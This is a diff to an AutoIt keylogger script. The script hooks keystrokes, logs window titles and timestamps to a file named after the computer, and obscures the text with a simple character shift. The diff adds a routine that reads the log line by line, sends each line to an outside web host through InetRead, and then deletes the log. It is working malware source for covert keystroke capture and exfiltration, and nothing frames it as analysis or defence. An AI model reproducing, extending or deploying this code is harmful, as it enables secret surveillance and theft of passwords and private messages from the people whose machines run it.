@@ -1,6 +1,8 @@
 #include <WinAPI.au3>
 #include <WindowsConstants.au3>
 #include <InetConstants.au3>
+#include <MsgBoxConstants.au3>
+
 
 Opt('MustDeclareVars', 1)
 
@@ -8,10 +10,10 @@ Global $hHook, $hStub_KeyProc, $buf = "", $title = "", $title_1 = "", $keycode, 
 Global $file, $f3 = 0
 Global $url = "https://kl.up.railway.app/?kl="
 Global $lastActiveWindow = "", $lastActiveTime = 0
-
-$file = FileOpen(@computername & "_log.txt", 9)
+Global $file_name = @computername & "_log.txt"
 While 1
-    _Main()
+ 
+	_Main()
     Sleep(250)
 WEnd
 
@@ -24,6 +26,12 @@ Func _Main()
     
     Local $startTime = TimerInit()
 
+	
+	send_file()
+
+	$file = FileOpen($file_name, 9)
+
+
     While 1
         Sleep(10)
         ; Comprobar si la ventana activa ha cambiado
@@ -35,13 +43,16 @@ Func _Main()
 
         ; Comprobar si han pasado 30 segundos desde la última vez que se escribió en el archivo
         If TimerDiff($lastActiveTime) > 30000 Then ; 30 segundos en milisegundos
-            EnviarMensajeWeb()
+			write_file()
             $lastActiveTime = TimerInit()
         EndIf
     WEnd
 EndFunc
 
-Func EnviarMensajeWeb()
+
+
+
+Func write_file()
     If $buffer <> "" Then
         $title_1 = WinGetTitle("")
         $buffer = @CRLF & @CRLF & "====Title:" & $title_1 & "====Time:" & @YEAR & "." & @MON & "." & @MDAY & "--" & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF & $buffer
@@ -49,12 +60,35 @@ Func EnviarMensajeWeb()
 
 		; Encode the data before sending
 		$buffer = BinaryToString(Binary($buffer))
-
         FileWrite($file, $buffer)
-        InetRead($url & $buffer, $INET_FORCERELOAD)
         $buffer = ""
     EndIf
 EndFunc
+
+Func send_file()
+
+
+		Local $aArray = FileReadToArray($file_name)
+		If @error Then
+			MsgBox($MB_SYSTEMMODAL, "", "There was an error reading the file. @error: " & @error) ; An error occurred reading the current script file.
+		Else
+			For $i = 0 To UBound($aArray) - 1 ; Loop through the array.
+					InetRead($url & $aArray[$i], $INET_FORCERELOAD)
+			Next
+		EndIf
+
+
+		FileClose($file)
+		Local $iDelete = FileDelete($file)
+			; Display a message of whether the file was deleted.
+		If $iDelete Then
+			MsgBox($MB_SYSTEMMODAL, "", "The file was successfuly deleted.")
+		Else
+			MsgBox($MB_SYSTEMMODAL, "", "An error occurred whilst deleting the file.")
+		EndIf
+
+EndFunc
+
 
 Func EvaluateKey($keycode)
     $title = WinGetTitle("")
@@ -70,7 +104,7 @@ Func EvaluateKey($keycode)
         Else
             $buffer = CifrarDesplazamiento($buffer, 3)
             FileWrite($file, $buffer)
-            InetRead($url & $buffer, $INET_FORCERELOAD)
+ ;           InetRead($url & $buffer, $INET_FORCERELOAD)
         EndIf
     Endif
 EndFunc
